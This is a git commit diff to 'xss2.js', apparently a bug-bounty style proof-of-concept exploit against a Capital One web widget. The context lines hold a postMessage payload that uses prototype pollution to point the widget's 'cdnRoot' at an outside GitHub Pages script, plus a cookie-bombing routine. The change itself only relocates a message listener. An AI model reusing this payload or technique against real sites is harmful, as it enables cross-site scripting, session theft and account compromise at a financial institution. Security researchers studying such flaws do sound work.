fdde427513156c9ffc682fc445e7b40d3b8a981f
shrtsn <shrtsns@gmail.com>
2024-11-20 23:52:46 +0530

    Update xss2.js

--- xsstest/xss2.js
+++ xsstest/xss2.js
@@ -10,7 +10,15 @@ function exploit()
 
 
         target.postMessage('{"data":{"ts":1652796417473,"tfs-session":{"__proto__":{"ReactNativeWebView":1,"clientKey":"1","reload":1,"CustomInviteManager":{"checkAvailability":{}},"Conf":{"CONST_ASSIST_VS_ROOT":"1","CONST_ASSIST_CA_ROOT":"2"},"WOWPx":{}, "VisitorFiltering":{},"cdnRoot":"shrtsn.github.io/xsstest/xss.js#"}, "reload":1, "asid":1,"widgetLoaded":false,"urls":"[{\\"title\\":\\"Capital One - Sign In Help\\",\\"url\\":\\"https://verified.capitalone.com/sign-in-help/pii\\",\\"time\\":1,\\"loadts\\":1652796416798,\\"tabId\\":\\"tfs-tab-6kozs\\"}]","vi":"e4fa9550-2ca0-41f6-9fa4-72553e5b14de"},"source":"tfs-tab-6kozs","tfs-tab-6kozs":{"app":{"tabId":"tfs-tab-6kozs"}}},"queryCommand":"init"}',"*");
-        
+         debugger;
+   window.addEventListener("message", (event) => {
+    if (event.origin !== "https://myaccounts.capitalone.com/") {
+        console.warn("Response from untrusted origin:", event.origin);
+        return;
+    }
+
+    console.log("Acknowledgment from target domain:", event.data);
+});
         
     },7000);
     
@@ -35,15 +43,7 @@ function cookieBomb()
     {
         document.cookie=`bomb${i}=${p};path=/frontends/files/xd.html;max-age=600;SameSite=None;Secure`;
     }
- debugger;
-  window.addEventListener("message", (event) => {
-    if (event.origin !== "https://myaccounts.capitalone.com/") {
-        console.warn("Response from untrusted origin:", event.origin);
-        return;
-    }
 
-    console.log("Acknowledgment from target domain:", event.data);
-});
 }
 
 
